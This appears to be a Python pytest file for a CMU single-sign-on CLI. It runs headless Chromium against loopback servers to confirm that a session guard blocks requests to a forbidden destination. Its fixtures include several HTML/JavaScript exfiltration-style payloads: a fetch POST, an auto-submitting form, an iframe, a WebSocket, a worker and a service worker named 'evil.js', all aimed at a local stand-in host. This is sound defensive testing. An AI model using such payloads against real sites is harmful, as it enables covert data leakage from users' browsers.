"""Real Chromium + loopback upstream ledger. No institutional network/accounts.

Only the test's *transport* maps an already-approved production URL to loopback;
production URL/method/frame policy is never patched or configurable.
Run explicitly: CMU_SSO_ENGINE_TESTS=1 python -m pytest tests/test_sso_engine.py
"""

import contextlib
import os
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from types import SimpleNamespace

import pytest
import requests

from cmu_cli import sso_session as sso
from cmu_cli.sso_transport import bounded_response

_REAL_REQUEST = requests.Session.request


@pytest.fixture(autouse=True)
def offline(monkeypatch):
    """This module permits only loopback HTTP, never institutional traffic."""
    from urllib.parse import urlsplit

    def loopback_only(self, method, url, **kwargs):
        parsed = urlsplit(url)
        assert parsed.scheme == "http" and parsed.hostname == "127.0.0.1"
        assert kwargs.get("allow_redirects") is False
        return _REAL_REQUEST(self, method, url, **kwargs)

    monkeypatch.setattr(requests.Session, "request", loopback_only)


pytestmark = pytest.mark.skipif(
    os.environ.get("CMU_SSO_ENGINE_TESTS") != "1", reason="opt-in real Chromium tests"
)


@contextlib.contextmanager
def upstream(body=b"OK", headers=None, status=200):
    ledger = []

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def do_GET(self):
            ledger.append((self.command, self.path))
            self.send_response(status)
            for name, value in (headers or {}).items():
                self.send_header(name, value)
            self.end_headers()
            with contextlib.suppress(BrokenPipeError, ConnectionResetError):
                self.wfile.write(body)

        do_POST = do_GET

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{server.server_port}", ledger
    finally:
        server.shutdown()
        server.server_close()
        thread.join()


@pytest.mark.parametrize(
    "attack",
    [
        "redirect",
        "meta",
        "iframe",
        "popup",
        "fetch",
        "form",
        "websocket",
        "worker",
        "serviceworker",
    ],
)
def test_engine_forbidden_destination_receives_zero_requests(
    tmp_path, monkeypatch, attack
):
    from playwright.sync_api import sync_playwright

    with upstream() as (forbidden, forbidden_ledger):
        snippets = {
            "redirect": "",
            "meta": f'<meta http-equiv="refresh" content="0;url={forbidden}/secret">',
            "iframe": f'<iframe src="{forbidden}/secret"></iframe>',
            "popup": f'<script>window.open("{forbidden}/secret")</script>',
            "fetch": f'<script>fetch("{forbidden}/secret", {{method:"POST",body:"SYNTHETIC"}})</script>',
            "form": f'<form action="{forbidden}/secret" method="POST"><input name="x" value="SYNTHETIC"></form><script>document.forms[0].submit()</script>',
            "websocket": f'<script>new WebSocket("{forbidden.replace("http:", "ws:")}/secret")</script>',
            "worker": f'<script>new Worker("{forbidden}/secret")</script>',
            "serviceworker": '<script>navigator.serviceWorker.register("/sio/evil.js")</script>',
        }
        headers = {"Content-Type": "text/html"}
        if attack == "redirect":
            headers["Location"] = forbidden + "/secret"
        with upstream(
            snippets[attack].encode(), headers, 302 if attack == "redirect" else 200
        ) as (source, source_ledger):

            def local_transport(request, **kwargs):
                # Only approved routes ever arrive here. No production host is sent.
                return bounded_response(
                    SimpleNamespace(
                        method=request.method,
                        url=source + "/source",
                        all_headers=lambda: {"Accept-Encoding": "identity"},
                        post_data_buffer=request.post_data_buffer,
                    ),
                    **kwargs,
                )

            monkeypatch.setattr(sso, "bounded_response", local_transport)
            with sync_playwright() as pw:
                browser = pw.chromium.launch(headless=True)
                context = browser.new_context(
                    service_workers="block", accept_downloads=False
                )
                page, blocked = sso.SsoSession(tmp_path / "state.json")._guard(
                    context, login=True
                )
                with contextlib.suppress(Exception):
                    page.goto("https://s3.andrew.cmu.edu/sio/", timeout=5000)
                page.wait_for_timeout(400)
                assert source_ledger == [("GET", "/source")]
                assert forbidden_ledger == []
                if attack not in {"worker", "serviceworker"}:
                    assert blocked
                browser.close()


@pytest.mark.parametrize(
    "headers,body",
    [
        ({"Content-Length": "999999999"}, b"x"),
        ({}, b"x" * 2048),
        ({"Content-Encoding": "gzip"}, b"compressed-bomb-placeholder"),
    ],
)
def test_real_stream_rejects_oversize_or_compression(headers, body):
    with upstream(body, headers) as (source, ledger):
        request = SimpleNamespace(
            method="GET", url=source, all_headers=lambda: {}, post_data_buffer=None
        )
        with pytest.raises(ValueError):
            bounded_response(request, limit=1024)
        assert len(ledger) == 1


def test_real_stream_boundary_and_redirect_not_followed():
    with (
        upstream() as (forbidden, ledger),
        upstream(b"x" * 1024, {"Location": forbidden}, 302) as (source, _),
    ):
        response = bounded_response(
            SimpleNamespace(
                method="GET",
                url=source,
                all_headers=lambda: {},
                post_data_buffer=None,
            ),
            limit=1024,
        )
        assert response["body"] == b"x" * 1024
        assert response["status"] == 302
        assert ledger == []
